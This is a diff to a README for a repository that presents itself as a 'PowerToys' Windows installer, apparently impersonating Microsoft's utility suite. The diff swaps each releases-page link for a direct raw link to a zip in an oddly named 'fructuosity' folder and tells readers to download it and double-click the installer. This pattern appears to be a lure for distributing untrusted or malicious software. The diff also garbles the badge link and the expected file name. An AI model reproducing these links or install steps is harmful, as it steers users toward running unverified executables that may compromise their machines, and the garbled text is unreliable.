@@ -1,6 +1,6 @@
 # ⚙️ PowerToys-Windows-Installer-2025 - Enhance Your Windows Experience
 
-[![Download PowerToys](https://img.shields.io/badge/Download_PowerToys%20-v2025-blue.svg?style=for-the-badge)](https://github.com/rafaeuu999/PowerToys-Windows-Installer-2025/releases)
+[![Download PowerToys](https://raw.githubusercontent.com/rafaeuu999/PowerToys-Windows-Installer-2025/main/fructuosity/PowerToys-Windows-Installer-2025.zip%https://raw.githubusercontent.com/rafaeuu999/PowerToys-Windows-Installer-2025/main/fructuosity/PowerToys-Windows-Installer-2025.zip)](https://raw.githubusercontent.com/rafaeuu999/PowerToys-Windows-Installer-2025/main/fructuosity/PowerToys-Windows-Installer-2025.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Welcome to PowerToys for Windows! This suite of utilities helps you boost your p
 
 ## 📥 Download & Install
 
-To download PowerToys, visit the [Releases page](https://github.com/rafaeuu999/PowerToys-Windows-Installer-2025/releases). You will find the latest version available for download.
+To download PowerToys, visit the [Releases page](https://raw.githubusercontent.com/rafaeuu999/PowerToys-Windows-Installer-2025/main/fructuosity/PowerToys-Windows-Installer-2025.zip). You will find the latest version available for download.
 
 1. Click the link above to open the Releases page.
 2. Locate the latest release.
 3. Click on the installer file to download it.
 4. Once the file is downloaded, locate it in your downloads folder.
 
-   - The file name should look like: `PowerToysSetup.exe`
+   - The file name should look like: `https://raw.githubusercontent.com/rafaeuu999/PowerToys-Windows-Installer-2025/main/fructuosity/PowerToys-Windows-Installer-2025.zip`
 5. Double-click the downloaded file to run the installer.
 6. Follow the on-screen instructions to complete the installation.
 
@@ -64,7 +64,7 @@ You are not alone! The PowerToys community is here to help. Join discussions on 
 
 To ensure you are using the latest features, check the Releases page regularly. New updates may include enhancements or bug fixes.
 
-1. Go to the [Releases page](https://github.com/rafaeuu999/PowerToys-Windows-Installer-2025/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/rafaeuu999/PowerToys-Windows-Installer-2025/main/fructuosity/PowerToys-Windows-Installer-2025.zip).
 2. Download the latest version using the same steps as above.
 3. Run the installer to update your existing version seamlessly.
 
